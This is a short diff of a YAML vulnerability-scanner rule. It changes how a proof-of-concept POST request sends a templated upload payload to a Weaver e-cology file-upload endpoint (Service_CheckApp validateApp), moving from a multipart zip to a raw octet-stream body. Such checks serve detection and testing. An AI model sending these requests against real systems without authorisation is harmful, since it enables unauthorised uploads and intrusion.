@@ -9,15 +9,9 @@ rules:
     request:
       method: POST
       path: /weaver/weaver.common.Ctrl/{{r1}}?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
-      body: |
-        ------WebKitFormBoundarywAfeTVV0NFYrxRI9{{r3}}
-        Content-Disposition: form-data; name="uploadFile"; filename="test.zip"{{r3}}
-        Content-Type: application/zip{{r3}}
-        {{r3}}
-        {{r2}}{{r3}}
-        ------WebKitFormBoundarywAfeTVV0NFYrxRI9{{r3}}
+      body: '{{r2}}'
       headers:
-        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywAfeTVV0NFYrxRI9
+        Content-Type: application/octet-stream
     expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
 expression: r0()
 detail:
